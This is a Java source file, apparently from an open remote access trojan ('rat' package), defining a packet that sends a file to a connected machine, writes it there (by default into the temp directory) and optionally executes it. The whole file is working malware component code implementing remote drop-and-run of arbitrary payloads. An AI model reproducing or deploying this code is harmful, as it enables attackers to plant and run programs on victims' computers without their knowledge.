package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.QuickLZ;

public final class UploadFilePacket implements IPacket {
	
	private byte[] data;
	private String directoryPath, fileName;
	private byte executeType;
	
	private static final String SEPARATOR_REGEX = "[\\\\\\/]";
	private static final String SEPARATOR = "/";
	private static final byte NO = 0;
	private static final byte YES = 1;
	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
	
	public UploadFilePacket(final String filePath, final String directoryPath, final boolean execute) {
		this.directoryPath = directoryPath.replaceAll(SEPARATOR_REGEX, SEPARATOR);
		
		final File file = new File(filePath);
		
		data = FileUtils.readExternalData(filePath);
		fileName = file.getName();
		executeType = execute ? YES : NO;
	}
	
	public UploadFilePacket(final File file, final String folderPath, final boolean execute) {
		this(file.getAbsolutePath(), folderPath, execute);
	}
	
	public UploadFilePacket(final String filePath, final String directoryPath) {
		this(filePath, directoryPath, false);
	}
	
	public UploadFilePacket(final File file, final String folderPath) {
		this(file, folderPath, false);
	}
	
	public UploadFilePacket() {
		data = new byte[0];
		directoryPath = fileName = "";
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		final byte[] compressed = QuickLZ.compress(data);
		
		connection.writeInt(compressed.length);
		connection.write(compressed);
		connection.writeUTF(directoryPath);
		connection.writeUTF(fileName);
		connection.writeByte(executeType);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		data = QuickLZ.decompress(data);
		
		directoryPath = connection.readUTF();
		fileName = connection.readUTF();
		executeType = connection.readByte();
		
		if (directoryPath.isEmpty()) {
			directoryPath = TEMP_DIR;
		}
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final File directory = new File(directoryPath);
		
		String directoryPath = null;
		
		if (directory.isDirectory()) {
			directoryPath = this.directoryPath;
		} else {
			final File parent = directory.getParentFile();
			
			if (parent != null) {
				directoryPath = parent.getAbsolutePath();
			}
		}
		
		if (directoryPath != null) {
			final String path = directoryPath + File.separator + fileName;
			final File file = new File(path);
			
			FileUtils.createFile(path);
			FileUtils.writeData(file, data);
			
			if (executeType == YES) {
				FileUtils.executeFile(file);
			}
		}
	}
	
}
